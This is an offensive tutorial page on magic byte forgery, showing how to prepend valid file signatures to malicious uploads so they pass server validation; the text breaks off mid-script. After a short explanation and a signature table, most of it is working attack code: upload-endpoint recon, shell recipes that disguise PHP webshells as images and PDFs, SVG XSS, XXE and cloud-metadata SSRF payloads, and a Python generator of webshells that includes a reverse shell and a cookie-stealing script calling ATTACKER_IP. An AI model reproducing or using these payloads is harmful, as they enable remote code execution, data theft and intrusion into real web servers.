---
title: Magic Byte Forgery
description: Magic Byte Forgery — Bypass File Upload Validation via Header Manipulation
navigation:
  icon: i-lucide-file-symlink
  title: Magic Byte Forgery
---

## Magic Byte Forgery

::badge
**High Severity — CWE-434 / CWE-345 / CWE-646**
::

::note
Magic bytes (also called file signatures, magic numbers, or file headers) are the first few bytes of a file that identify its format. Operating systems, web applications, libraries, and WAFs use these bytes to determine file type independently of the file extension. **Magic Byte Forgery** is the technique of prepending or injecting legitimate file signature bytes into a malicious file so it passes server-side content validation while still executing as a dangerous file type (PHP, JSP, ASPX, etc.). This is one of the most reliable file upload bypass techniques in bug bounty hunting.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-scan-eye" label="How Magic Byte Validation Works"}
  1. User uploads a file to the web application
  2. Server reads the **first N bytes** of the uploaded file
  3. These bytes are compared against a table of known file signatures
  4. If the bytes match an allowed type (e.g., JPEG `FF D8 FF`), the upload is accepted
  5. The server **trusts the magic bytes** over the extension or Content-Type header
  6. File is saved and potentially served from a web-accessible directory

  **The flaw:** Magic byte validation alone is insufficient because an attacker can prepend valid image/document headers to a webshell. The web server then executes the file based on its extension, ignoring the magic bytes entirely.
  :::

  :::accordion-item{icon="i-lucide-layers" label="Validation Layers in File Uploads"}
  | Layer | What It Checks | Bypass Difficulty |
  | ----- | -------------- | ----------------- |
  | **Client-side JS** | Extension, MIME type in browser | Trivial — intercept with Burp |
  | **Content-Type header** | `Content-Type: image/jpeg` | Trivial — modify in request |
  | **File extension** | `.php`, `.jpg`, `.exe` | Moderate — double ext, null byte |
  | **Magic bytes** | First 2-8 bytes of file content | Moderate — prepend valid header |
  | **Full file parsing** | Attempt to render/decode file | Hard — requires valid file structure |
  | **Re-encoding** | Server re-saves as new image | Very Hard — polyglot techniques |
  | **Sandboxed execution** | Runs file in isolated environment | Very Hard — requires sandbox escape |

  ::tip
  Most applications implement only 1-3 of these layers. Magic byte forgery targets the content-validation layer specifically.
  ::
  :::

  :::accordion-item{icon="i-lucide-target" label="Impact Scenarios"}
  | Impact | Description | Severity |
  | ------ | ----------- | -------- |
  | **Remote Code Execution** | Webshell uploaded and executed via forged image header | Critical |
  | **Stored XSS** | SVG/HTML with JavaScript uploaded as valid image | High |
  | **Server-Side Request Forgery** | SVG with external entity reference processed server-side | High |
  | **Denial of Service** | Decompression bomb disguised as valid archive | Medium |
  | **Malware Distribution** | Executable disguised as document/image | High |
  | **XXE via Document Upload** | DOCX/XLSX with XXE payload passes magic check | High |
  | **Deserialization Attack** | Serialized object disguised as allowed file type | Critical |
  | **Local File Inclusion** | Uploaded polyglot included by application code | Critical |
  :::

  :::accordion-item{icon="i-lucide-cpu" label="Why Magic Bytes Exist"}
  Every file format defines specific bytes at the start (and sometimes end) of the file to identify itself. This predates file extensions and is considered more reliable by many security implementations.

  **Common misconception:** "If the magic bytes match, the file is safe." This is false — magic bytes only confirm the first few bytes; the rest of the file can contain anything, including executable code that the web server will interpret based on the file extension or server configuration.
  :::
::

---

## Magic Byte Signature Reference

::tip
This reference table is your primary tool for crafting forged files. Each entry shows the exact bytes needed to pass validation for that file type.
::

### Image Formats

::collapsible

| Format | Magic Bytes (Hex) | Magic Bytes (ASCII) | Offset | Minimum Header |
| ------ | ----------------- | ------------------- | ------ | -------------- |
| **JPEG/JFIF** | `FF D8 FF E0` | `ÿØÿà` | 0 | 4 bytes |
| **JPEG/EXIF** | `FF D8 FF E1` | `ÿØÿá` | 0 | 4 bytes |
| **JPEG (generic)** | `FF D8 FF` | `ÿØÿ` | 0 | 3 bytes |
| **PNG** | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG\r\n\x1a\n` | 0 | 8 bytes |
| **GIF87a** | `47 49 46 38 37 61` | `GIF87a` | 0 | 6 bytes |
| **GIF89a** | `47 49 46 38 39 61` | `GIF89a` | 0 | 6 bytes |
| **BMP** | `42 4D` | `BM` | 0 | 2 bytes |
| **TIFF (LE)** | `49 49 2A 00` | `II*\x00` | 0 | 4 bytes |
| **TIFF (BE)** | `4D 4D 00 2A` | `MM\x00*` | 0 | 4 bytes |
| **WebP** | `52 49 46 46 ?? ?? ?? ?? 57 45 42 50` | `RIFF....WEBP` | 0 | 12 bytes |
| **ICO** | `00 00 01 00` | `\x00\x00\x01\x00` | 0 | 4 bytes |
| **PSD** | `38 42 50 53` | `8BPS` | 0 | 4 bytes |
| **SVG** | `3C 73 76 67` or `3C 3F 78 6D 6C` | `<svg` or `<?xml` | 0 | 4-5 bytes |

::

### Document & Archive Formats

::collapsible

| Format | Magic Bytes (Hex) | Magic Bytes (ASCII) | Offset | Notes |
| ------ | ----------------- | ------------------- | ------ | ----- |
| **PDF** | `25 50 44 46 2D` | `%PDF-` | 0 | 5 bytes |
| **ZIP** | `50 4B 03 04` | `PK\x03\x04` | 0 | Also DOCX, XLSX, PPTX, JAR, APK |
| **RAR** | `52 61 72 21 1A 07` | `Rar!\x1a\x07` | 0 | 6 bytes |
| **7z** | `37 7A BC AF 27 1C` | `7z¼¯'\x1c` | 0 | 6 bytes |
| **GZIP** | `1F 8B` | `\x1f\x8b` | 0 | 2 bytes |
| **TAR** | `75 73 74 61 72` | `ustar` | 257 | Offset at 257 |
| **DOCX/XLSX/PPTX** | `50 4B 03 04` | `PK\x03\x04` | 0 | ZIP-based Office formats |
| **DOC (OLE)** | `D0 CF 11 E0 A1 B1 1A E1` | `ÐÏ.à¡±\x1a\xe1` | 0 | Legacy Office format |
| **RTF** | `7B 5C 72 74 66` | `{\rtf` | 0 | 5 bytes |
| **XML** | `3C 3F 78 6D 6C` | `<?xml` | 0 | 5 bytes |

::

### Media & Executable Formats

::collapsible

| Format | Magic Bytes (Hex) | Magic Bytes (ASCII) | Offset | Notes |
| ------ | ----------------- | ------------------- | ------ | ----- |
| **MP3 (ID3)** | `49 44 33` | `ID3` | 0 | 3 bytes |
| **MP4** | `66 74 79 70` | `ftyp` | 4 | Offset at 4 |
| **AVI** | `52 49 46 46 ?? ?? ?? ?? 41 56 49 20` | `RIFF....AVI ` | 0 | 12 bytes |
| **WAV** | `52 49 46 46 ?? ?? ?? ?? 57 41 56 45` | `RIFF....WAVE` | 0 | 12 bytes |
| **FLV** | `46 4C 56` | `FLV` | 0 | 3 bytes |
| **OGG** | `4F 67 67 53` | `OggS` | 0 | 4 bytes |
| **FLAC** | `66 4C 61 43` | `fLaC` | 0 | 4 bytes |
| **EXE/DLL (PE)** | `4D 5A` | `MZ` | 0 | 2 bytes |
| **ELF** | `7F 45 4C 46` | `\x7fELF` | 0 | 4 bytes |
| **Mach-O** | `FE ED FA CE` | — | 0 | 4 bytes (32-bit) |
| **Mach-O 64** | `FE ED FA CF` | — | 0 | 4 bytes (64-bit) |
| **Java Class** | `CA FE BA BE` | `Êþº¾` | 0 | 4 bytes |
| **DEX (Android)** | `64 65 78 0A` | `dex\n` | 0 | 4 bytes |
| **WASM** | `00 61 73 6D` | `\x00asm` | 0 | 4 bytes |

::

---

## Reconnaissance & Target Identification

### Upload Endpoint Discovery

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Automated Crawling"}
  ```bash
  # ── Discover upload endpoints across target ──
  katana -u https://target.com -d 5 -jc -kf -ef css,woff,woff2 -o crawl.txt
  grep -iE "upload|import|attach|avatar|profile|media|image|photo|file|document|resume|logo|banner|cover|icon|thumb" crawl.txt | sort -u > upload_urls.txt

  # GAU + Wayback for historical upload endpoints
  echo "target.com" | gau --threads 10 | grep -iE "upload|attach|import|media|file|image" | sort -u >> upload_urls.txt

  # Ffuf hidden endpoint discovery
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
    -mc 200,301,302,405 | grep -iE "upload|file|media|import|attach|image|avatar"

  # Specific path brute forcing
  ffuf -u https://target.com/FUZZ \
    -w <(cat << 'EOF'
  upload
  upload.php
  api/upload
  api/v1/upload
  api/v2/files
  api/files/upload
  api/media
  api/images
  api/attachments
  admin/upload
  admin/media
  admin/files
  user/avatar
  profile/photo
  settings/logo
  editor/upload
  ckeditor/upload
  tinymce/upload
  elfinder/connector
  filemanager/upload
  wp-admin/async-upload.php
  wp-content/uploads
  ckfinder/core/connector/php/connector.php
  FCKeditor/editor/filemanager/connectors/php/upload.php
  EOF
  ) -mc 200,301,302,401,403,405
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Manual Detection"}
  ```bash
  # ── Identify what file types are accepted ──

  # Test each endpoint with OPTIONS/HEAD
  curl -sI -X OPTIONS https://target.com/api/upload
  curl -sI https://target.com/api/upload

  # Check for upload forms in HTML
  curl -s https://target.com/profile | grep -iE "enctype|file.*input|type=\"file\"|accept="

  # Extract accepted MIME types from HTML
  curl -s https://target.com/profile | grep -oP 'accept="[^"]*"'
  # Common patterns:
  # accept="image/*"
  # accept=".jpg,.png,.gif"
  # accept="image/jpeg,image/png"
  # accept=".pdf,.doc,.docx"

  # Test upload with basic file to see error messages
  echo "test" > test.txt
  curl -X POST https://target.com/api/upload \
    -F "file=@test.txt" \
    -H "Cookie: session=TOKEN" -v 2>&1 | grep -iE "error|type|allowed|invalid|format|accept"

  # Error messages reveal allowed types:
  # "Only image files are allowed"
  # "Accepted formats: jpg, png, gif"
  # "Invalid file type. Expected: image/jpeg"
  # "File signature does not match"  ← indicates magic byte validation
  ```
  :::

  :::tabs-item{icon="i-lucide-microscope" label="Validation Detection"}
  ```bash
  # ── Determine WHICH validation layers are active ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=AUTH_TOKEN"
  FIELD="file"

  echo "═══ Test 1: Extension-only validation ═══"
  echo '<?php echo "test"; ?>' > test.php
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@test.php" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .php extension — $([ "$STATUS" = "200" ] && echo "ALLOWED" || echo "BLOCKED")"

  echo '<?php echo "test"; ?>' > test.php.jpg
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@test.php.jpg" -H "Cookie: $COOKIE")
  echo "[${STATUS}] .php.jpg double ext — $([ "$STATUS" = "200" ] && echo "ALLOWED" || echo "BLOCKED")"

  echo "═══ Test 2: Content-Type validation ═══"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@test.php;type=image/jpeg;filename=test.jpg" -H "Cookie: $COOKIE")
  echo "[${STATUS}] PHP content + image/jpeg Content-Type — $([ "$STATUS" = "200" ] && echo "ALLOWED" || echo "BLOCKED")"

  echo "═══ Test 3: Magic byte validation ═══"
  # Create file with JPEG header + PHP code
  printf '\xFF\xD8\xFF\xE0<?php echo "test"; ?>' > magic_test.jpg
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@magic_test.jpg" -H "Cookie: $COOKIE")
  echo "[${STATUS}] JPEG magic + PHP content (.jpg) — $([ "$STATUS" = "200" ] && echo "ALLOWED" || echo "BLOCKED")"

  printf '\xFF\xD8\xFF\xE0<?php echo "test"; ?>' > magic_test.php
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@magic_test.php" -H "Cookie: $COOKIE")
  echo "[${STATUS}] JPEG magic + PHP content (.php) — $([ "$STATUS" = "200" ] && echo "ALLOWED" || echo "BLOCKED")"

  echo "═══ Test 4: Full file parsing ═══"
  # Create a truly valid JPEG (1x1 pixel) with PHP in EXIF comment
  python3 -c "
  import struct
  # Minimal valid JPEG with comment segment containing PHP
  data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  comment = b'<?php system(\$_GET[\"cmd\"]); ?>'
  data += b'\xff\xfe' + struct.pack('>H', len(comment)+2) + comment
  data += b'\xff\xd9'
  open('parse_test.jpg','wb').write(data)
  "
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@parse_test.jpg" -H "Cookie: $COOKIE")
  echo "[${STATUS}] Valid JPEG + PHP in comment — $([ "$STATUS" = "200" ] && echo "ALLOWED" || echo "BLOCKED")"

  echo "═══ Test 5: Re-encoding detection ═══"
  # Upload valid image and check if it's re-encoded (dimensions/size change)
  # If re-encoded, PHP code in metadata will be stripped
  curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@parse_test.jpg" -H "Cookie: $COOKIE" -o upload_response.txt
  echo "[*] Check upload_response.txt for returned file URL, then compare file sizes"

  rm -f test.php test.php.jpg magic_test.jpg magic_test.php parse_test.jpg
  ```
  :::
::

---

## Payload Crafting — Core Techniques

::warning
Magic byte forgery works by prepending valid file headers to malicious payloads. The web server determines execution based on extension or configuration, while the validation engine checks only the magic bytes.
::

### Quick CLI Crafting

::code-group
```bash [JPEG Header Forgery]
# ── JPEG magic bytes: FF D8 FF E0 ──

# Method 1: printf + shell
printf '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Method 2: echo with hex
echo -ne '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell.php
echo '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>' >> shell.php

# Method 3: Python one-liner
python3 -c "open('shell.php','wb').write(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' + b'<?php system(\$_GET[\"cmd\"]); ?>')"

# Method 4: Minimal JPEG header (only 3 bytes needed for some validators)
printf '\xFF\xD8\xFF' > shell.php.jpg
cat webshell.php >> shell.php.jpg

# Verify magic bytes
file shell.php
# Output: shell.php: JPEG image data
xxd shell.php | head -3
hexdump -C shell.php | head -3
```

```bash [PNG Header Forgery]
# ── PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A ──

# Method 1: printf
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Method 2: Full PNG header with IHDR chunk
python3 -c "
import struct
png_header = b'\x89PNG\r\n\x1a\n'
# IHDR chunk (1x1 pixel, 8-bit RGB)
ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
ihdr_crc = b'\x00' * 4  # Simplified CRC
ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + ihdr_crc
payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
open('shell.php','wb').write(png_header + ihdr + payload)
"

# Method 3: Append to existing valid PNG
cp valid_image.png shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png

# Verify
file shell.php
xxd shell.php | head -2
```

```bash [GIF Header Forgery]
# ── GIF magic bytes: 47 49 46 38 39 61 (GIF89a) ──
# GIF is the EASIEST format for magic byte forgery

# Method 1: ASCII string (no hex needed!)
echo -n 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Method 2: Full minimal GIF header
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' > shell.gif.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif.php

# Method 3: GIF87a variant
echo -n 'GIF87a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Method 4: One-liner
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Verify
file shell.php
# Output: shell.php: GIF image data, version 89a
```

```bash [BMP Header Forgery]
# ── BMP magic bytes: 42 4D (BM) ──

printf 'BM' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# With more realistic BMP header
python3 -c "
import struct
header = b'BM'
header += struct.pack('<I', 100)  # File size
header += b'\x00\x00\x00\x00'    # Reserved
header += struct.pack('<I', 54)   # Offset to pixel data
# DIB header
header += struct.pack('<I', 40)   # DIB header size
header += struct.pack('<i', 1)    # Width
header += struct.pack('<i', 1)    # Height
header += struct.pack('<HH', 1, 24)  # Planes, bits per pixel
header += b'\x00' * 24           # Rest of DIB header
payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
open('shell.php','wb').write(header + payload)
"

file shell.php
# Output: shell.php: PC bitmap, ...
```

```bash [PDF Header Forgery]
# ── PDF magic bytes: 25 50 44 46 2D (%PDF-) ──

echo '%PDF-1.4' > shell.pdf.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.pdf.php

# More realistic PDF + PHP
cat > shell.pdf.php << 'EOF'
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
<?php system($_GET["cmd"]); ?>
EOF

# PDF with embedded JavaScript (for client-side attacks)
cat > evil.pdf << 'PDFEOF'
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert('XSS via PDF')) >>
endobj
PDFEOF

file shell.pdf.php
```

```bash [SVG Forgery (XSS/SSRF)]
# ── SVG magic: <?xml or <svg ──
# SVG is XML-based — perfect for XSS and SSRF

# XSS via SVG
cat > xss.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <script type="text/javascript">
    alert(document.domain);
  </script>
  <rect width="100" height="100" fill="red"/>
</svg>
EOF

# SSRF via SVG external entity
cat > ssrf.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>
EOF

# XXE file read via SVG
cat > xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="12">&xxe;</text>
</svg>
EOF

# SVG with PHP (if server processes as PHP)
cat > polyglot.svg.php << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <text><?php system($_GET["cmd"]); ?></text>
</svg>
EOF

file xss.svg ssrf.svg xxe.svg
```
::

### Python Comprehensive Crafter

::code-collapse
```python [magic_byte_crafter.py]
#!/usr/bin/env python3
"""
Comprehensive Magic Byte Forgery Payload Generator
Generates webshells with valid file headers for multiple formats
"""
import struct
import zlib
import sys
import os

class MagicByteCrafter:
    """Generate magic-byte-forged payloads for upload bypass"""

    SHELLS = {
        "php": '<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
        "php_system": '<?php system($_GET["cmd"]); ?>',
        "php_eval": '<?php eval($_POST["e"]); ?>',
        "php_passthru": '<?php passthru($_GET["cmd"]); ?>',
        "php_reverse": '''<?php $sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/bash",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>''',
        "php_minimal": '<?=`$_GET[c]`?>',
        "php_base64": '<?php eval(base64_decode($_POST["e"])); ?>',
        "php_assert": '<?php @assert($_REQUEST["cmd"]); ?>',
        "jsp": '''<%@ page import="java.util.*,java.io.*"%><%String cmd=request.getParameter("cmd");if(cmd!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});Scanner s=new Scanner(p.getInputStream()).useDelimiter("\\\\A");out.println("<pre>"+(s.hasNext()?s.next():"")+"</pre>");}%>''',
        "asp": '<%eval request("cmd")%>',
        "aspx": '''<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">protected void Page_Load(object s,EventArgs e){string c=Request["cmd"];if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");}}</script>''',
        "xss": '<script>alert(document.domain)</script>',
        "xss_fetch": '<script>fetch("http://ATTACKER_IP/steal?c="+document.cookie)</script>',
        "ssi": '<!--#exec cmd="id"-->',
        "coldfusion": '<cfexecute name="/bin/bash" arguments="-c id" variable="output" timeout="10"/><cfoutput>#output#</cfoutput>',
    }

    @staticmethod
    def jpeg_header():
        """Minimal valid JPEG/JFIF header"""
        return (
            b'\xff\xd8\xff\xe0'          # SOI + APP0 marker
            b'\x00\x10'                   # APP0 length
            b'JFIF\x00'                   # JFIF identifier
            b'\x01\x01'                   # Version 1.1
            b'\x00'                       # Aspect ratio units
            b'\x00\x01\x00\x01'           # X/Y density
            b'\x00\x00'                   # No thumbnail
        )

    @staticmethod
    def jpeg_with_comment(payload_bytes):
        """Valid JPEG with PHP in COM (comment) segment"""
        header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        comment_marker = b'\xff\xfe'
        comment_length = struct.pack('>H', len(payload_bytes) + 2)
        eoi = b'\xff\xd9'
        return header + comment_marker + comment_length + payload_bytes + eoi

    @staticmethod
    def jpeg_exif_payload(payload_bytes):
        """JPEG with payload in EXIF data"""
        header = b'\xff\xd8\xff\xe1'
        exif_header = b'Exif\x00\x00'
        tiff_header = b'II\x2a\x00\x08\x00\x00\x00'
        ifd_count = struct.pack('<H', 1)
        # ImageDescription tag (0x010e) with payload
        tag = struct.pack('<HHII', 0x010e, 2, len(payload_bytes), 26)
        ifd_next = b'\x00\x00\x00\x00'
        exif_data = exif_header + tiff_header + ifd_count + tag + ifd_next + payload_bytes
        length = struct.pack('>H', len(exif_data) + 2)
        eoi = b'\xff\xd9'
        return header + length + exif_data + eoi

    @staticmethod
    def png_header():
        """Minimal PNG header"""
        return b'\x89PNG\r\n\x1a\n'

    @staticmethod
    def png_with_text(payload_bytes):
        """Valid PNG with payload in tEXt chunk"""
        header = b'\x89PNG\r\n\x1a\n'
        # IHDR chunk (1x1, 8-bit RGB)
        ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
        ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff)
        ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + ihdr_crc
        # tEXt chunk with payload
        text_data = b'Comment\x00' + payload_bytes
        text_crc = struct.pack('>I', zlib.crc32(b'tEXt' + text_data) & 0xffffffff)
        text_chunk = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + text_crc
        # IDAT chunk (minimal pixel data)
        raw_pixel = b'\x00\xff\x00\x00'
        compressed = zlib.compress(raw_pixel)
        idat_crc = struct.pack('>I', zlib.crc32(b'IDAT' + compressed) & 0xffffffff)
        idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + idat_crc
        # IEND chunk
        iend_crc = struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)
        iend = struct.pack('>I', 0) + b'IEND' + iend_crc
        return header + ihdr + text_chunk + idat + iend

    @staticmethod
    def gif_header():
        """Minimal GIF89a header"""
        return b'GIF89a'

    @staticmethod
    def gif_full(payload_bytes):
        """Complete valid GIF with payload appended"""
        gif = (
            b'GIF89a'                     # Header
            b'\x01\x00\x01\x00'           # 1x1 canvas
            b'\x80\x00\x00'               # GCT flag, color resolution
            b'\xff\xff\xff'               # Color 0: white
            b'\x00\x00\x00'               # Color 1: black
            b'\x21\xf9\x04'               # Graphic control extension
            b'\x00\x00\x00\x00\x00'       # GCE data
            b'\x2c\x00\x00\x00\x00'       # Image descriptor
            b'\x01\x00\x01\x00\x00'       # 1x1 image
            b'\x02\x02\x44\x01\x00'       # Image data
            b'\x3b'                        # GIF trailer
        )
        # GIF comment extension with payload
        comment = (
            b'\x21\xfe'                   # Comment extension marker
            + bytes([min(len(payload_bytes), 255)])
            + payload_bytes[:255]
            + b'\x00'
        )
        return gif[:-1] + comment + b'\x3b' + payload_bytes

    @staticmethod
    def bmp_header(payload_bytes):
        """BMP with payload after header"""
        file_size = 54 + len(payload_bytes)
        header = b'BM'
        header += struct.pack('<I', file_size)
        header += b'\x00\x00\x00\x00'
        header += struct.pack('<I', 54)
        header += struct.pack('<I', 40)
        header += struct.pack('<ii', 1, 1)
        header += struct.pack('<HH', 1, 24)
        header += b'\x00' * 24
        return header + payload_bytes

    @staticmethod
    def pdf_header(payload_bytes):
        """PDF with embedded payload"""
        return (
            b'%PDF-1.4\n'
            b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
            b'2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n'
            + payload_bytes + b'\n'
            b'%%EOF'
        )

    @staticmethod
    def tiff_header():
        """TIFF little-endian header"""
        return b'\x49\x49\x2a\x00\x08\x00\x00\x00'

    @staticmethod
    def webp_header():
        """WebP header (RIFF container)"""
        return b'RIFF\x00\x00\x00\x00WEBP'

    @staticmethod
    def ico_header():
        """ICO header"""
        return b'\x00\x00\x01\x00\x01\x00'

    @staticmethod
    def psd_header():
        """PSD (Photoshop) header"""
        return b'8BPS\x00\x01'

    @staticmethod
    def svg_xss():
        """SVG with XSS"""
        return b'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<script>alert(document.domain)</script>
<rect width="100" height="100" fill="red"/>
</svg>'''

    @staticmethod
    def svg_ssrf(url):
        """SVG with SSRF"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{url}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
<text x="10" y="50">&xxe;</text>
</svg>'''.encode()

    def craft_all(self, shell_type="php", output_dir="payloads"):
        """Generate all magic byte forgery payloads"""
        os.makedirs(output_dir, exist_ok=True)
        payload = self.SHELLS.get(shell_type, self.SHELLS["php"]).encode()

        crafted = {
            # Simple header prepend
            f"jpeg_simple.{shell_type}": self.jpeg_header() + payload,
            f"jpeg_comment.{shell_type}": self.jpeg_with_comment(payload),
            f"jpeg_exif.{shell_type}": self.jpeg_exif_payload(payload),
            f"png_simple.{shell_type}": self.png_header() + payload,
            f"png_text.{shell_type}": self.png_with_text(payload),
            f"gif_simple.{shell_type}": self.gif_header() + payload,
            f"gif_full.{shell_type}": self.gif_full(payload),
            f"bmp_simple.{shell_type}": self.bmp_header(payload),
            f"pdf_simple.{shell_type}": self.pdf_header(payload),
            f"tiff_simple.{shell_type}": self.tiff_header() + payload,
            f"webp_simple.{shell_type}": self.webp_header() + payload,
            f"ico_simple.{shell_type}": self.ico_header() + payload,
            f"psd_simple.{shell_type}": self.psd_header() + payload,

            # Extension variants
            f"jpeg_shell.jpg": self.jpeg_header() + payload,
            f"jpeg_shell.jpeg": self.jpeg_header() + payload,
            f"png_shell.png": self.png_header() + payload,
            f"gif_shell.gif": self.gif_header() + payload,
            f"bmp_shell.bmp": self.bmp_header(payload),

            # Double extension
            f"shell.{shell_type}.jpg": self.jpeg_header() + payload,
            f"shell.{shell_type}.png": self.png_header() + payload,
            f"shell.{shell_type}.gif": self.gif_header() + payload,
            f"shell.jpg.{shell_type}": self.jpeg_header() + payload,

            # SVG payloads
            "xss.svg": self.svg_xss(),
            "ssrf_aws.svg": self.svg_ssrf("http://169.254.169.254/latest/meta-data/"),
            "ssrf_gcp.svg": self.svg_ssrf("http://metadata.google.internal/computeMetadata/v1/"),
            "xxe_passwd.svg": self.svg_ssrf("file:///etc/passwd"),
        }

        for filename, content in crafted.items():
            filepath = os.path.join(output_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(content)
            file_result = os.popen(f'file "{filepath}" 2>/dev/null').read().strip()
            print(f"[+] {filepath:45s} ({len(content):6d} bytes) — {file_result.split(': ',1)[-1][:50]}")

        print(f"\n[+] Generated {len(crafted)} payloads in {output_dir}/")
        return crafted


if __name__ == "__main__":
    crafter = MagicByteCrafter()

    # Generate PHP webshell payloads
    crafter.craft_all("php", "payloads_php")

    # Generate JSP payloads
    crafter.craft_all("jsp", "payloads_jsp")

    # Generate ASP payloads
    crafter.craft_all("asp", "payloads_asp")

    # Generate ASPX payloads
    crafter.craft_all("aspx", "payloads_aspx")

    # Generate XSS payloads
    crafter.craft_all("xss", "payloads_xss")
```
::

### EXIF Metadata Injection

::tabs
  :::tabs-item{icon="i-lucide-image" label="ExifTool Injection"}
  ```bash
  # ── Inject PHP code into EXIF metadata of real images ──
  # This passes FULL image parsing validation because the image is genuinely valid

  # Install exiftool
  sudo apt install libimage-exiftool-perl -y

  # Create a valid 1x1 JPEG first
  convert -size 1x1 xc:white base.jpg 2>/dev/null || \
    python3 -c "
  import struct
  # Minimal valid JPEG
  data = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  data += b'\xff\xdb\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\x09\x09'
  data += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f'
  data += b'\x1e\x1d\x1a\x1c\x1c\x20\x24\x2e\x27\x20\x22\x2c\x23\x1c\x1c\x28\x37'
  data += b'\x29\x2c\x30\x31\x34\x34\x34\x1f\x27\x39\x3d\x38\x32\x3c\x2e\x33\x34\x32'
